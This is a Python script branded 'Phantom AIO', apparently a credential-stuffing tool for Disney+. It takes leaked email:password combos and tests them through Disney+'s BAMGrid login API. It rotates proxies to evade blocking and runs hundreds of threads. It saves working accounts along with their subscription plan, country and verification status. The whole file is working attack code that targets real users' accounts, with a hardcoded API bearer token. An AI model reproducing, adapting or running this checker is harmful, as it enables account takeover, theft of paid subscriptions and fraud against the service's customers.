import os
import json
import time
import ctypes
import concurrent.futures
import asyncio
import aiohttp
import requests
import functools
import pystyle
import colorama
import easygui
import datetime
import threading
import tls_client

from requests import Session
from requests.adapters import HTTPAdapter, Retry
from colorama import Fore, Style
from pystyle import Write, System, Colors, Colorate
from threading import Lock
from random import choice

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

valid = 0
invalid = 0
custom = 0
proxy_error = 0
total_ver = 0
accounts_processed = 0

print()

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Disney+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Disney+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

bad_proxies = []
locked_proxies = []
proxies = []
proxy_type = "http"
proxy_lock = Lock()

def disney_checker(email, password):
    global valid, invalid, custom, proxy_error, total_ver, accounts_processed
    retries = 1
    timeout = 10
    try:
        proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
                 if len(open("./proxies.txt", "r").readlines()) != 0
                 else None)

        session = Session()

        if ":" in proxy and len(proxy.split(":")) == 4:
            ip, port, user, pw = proxy.split(":")
            proxy_string = f"http://{user}:{pw}@{ip}:{port}"
        else:
            ip, port = proxy.split(":")
            proxy_string = f"http://{ip}:{port}"

        session.proxies = {
            "http": proxy_string,
            "https": proxy_string
        }

        payload = {
            "deviceFamily": "browser",
            "applicationRuntime": "chrome",
            "deviceProfile": "windows",
            "attributes": {}
        }
        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }
        r = session.post('https://global.edge.bamgrid.com/devices', json=payload, headers=headers)
        if r.status_code == 403:
            raise

        token = r.json()['assertion']
        payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={token}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice"
        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }

        r = session.post('https://global.edge.bamgrid.com/token', data=payload, headers=headers)
        if 'unauthorized_client' in r.text or 'invalid-token' in r.text:
            raise

        auth_token = r.json()['access_token']
        headers = {
            "accept": "application/json; charset=utf-8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {auth_token}",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }
        payload = {
            'email': email
        }

        r = session.post('https://global.edge.bamgrid.com/idp/check', headers=headers, json=payload)
        if "\"operations\":[\"Register\"]" in r.text:
            time_rn = get_time_rn()
            invalid += 1
            accounts_processed += 1
            update_console_title()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            return
        elif "\"operations\":[\"OTP\"]" in r.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            folder = "Checked/Disney"
            if not os.path.exists(folder):
                os.makedirs(folder)
            custom += 1
            accounts_processed += 1
            update_console_title()
            with open("Checked/Disney/disney_custom.txt", "a+", encoding='utf-8') as cum:
                cum.write(f"{email}:{password}" + "\n")
            return
        elif "\"operations\":[\"Login\",\"OTP\"]" not in r.text:
            raise

        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {auth_token}",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }
        payload = {
            'email': email,
            'password': password
        }

        r = session.post('https://global.edge.bamgrid.com/idp/login', json=payload, headers=headers)
        if 'Bad credentials sent for' in r.text or 'is not a valid email Address at /email' in r.text or "idp.error.identity.bad-credentials" in r.text:
            invalid += 1
            accounts_processed += 1
            update_console_title()
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            return
        if 'token_type' not in r.text or 'id_token' not in r.text:
            raise

        id_token = r.json()['id_token']
        payload = {
            'id_token': id_token
        }
        headers = {
            "accept": "application/json; charset=utf-8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {auth_token}",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }

        r = session.post('https://global.edge.bamgrid.com/accounts/grant', json=payload, headers=headers)
        if 'Account archived' in r.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            invalid += 1
            accounts_processed += 1
            update_console_title()
            return

        assertion = r.json()['assertion']
        payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount"
        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }
        r = session.post("https://global.edge.bamgrid.com/token", data=payload, headers=headers)

        access_token = r.json()['access_token']
        headers = {
            "authorization": f"Bearer {access_token}",
            "accept": "application/vnd.session-service+json; version=1",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "origin": "https://www.disneyplus.com",
            "pragma": "no-cache",
            "referer": "https://www.disneyplus.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
            "x-bamsdk-client-id": "disney-svod-3d9324fc",
            "x-bamsdk-platform": "windows",
            "x-bamsdk-version": "4.16",
        }
        r = session.get('https://global.edge.bamgrid.com/subscriptions', headers=headers)
        if r.text == '[]' or ("\"isActive\":false" in r.text and "\"isActive\":true" not in r.text):
            time_rn = get_time_rn()
            custom += 1
            accounts_processed += 1
            update_console_title()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            folder = "Checked/Disney"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/Disney/disney_custom.txt", "a+", encoding='utf-8') as cum:
                cum.write(f"{email}:{password}" + "\n")
            return
        elif "\"isActive\":true" not in r.text:
            raise

        plan = r.text.split('name":"')[1].split('"')[0]
        re = session.get('https://global.edge.bamgrid.com/accounts/me', headers=headers)
        verified = re.text.split('emailVerified":')[1].split(',')[0]
        if verified == "true" or verified == True:
            total_ver += 1
            update_console_title()
        else:
            total_ver += 0
            update_console_title()
        country = re.text.split('country":"')[1].split('"')[0]
        time_rn = get_time_rn()
        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
        folder = "Checked/Disney"
        if not os.path.exists(folder):
            os.makedirs(folder)
        with open("Checked/Disney/disney_good.txt", "a+", encoding='utf-8') as cum:
            cum.write(f"{email}:{password} | Plan : {plan} | Country : {country} | Verified : {verified}" + "\n")
        valid += 1
        accounts_processed += 1
        update_console_title()
        return
    except:
        proxy_error += 1
        update_console_title()
        disney_checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    disney_checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()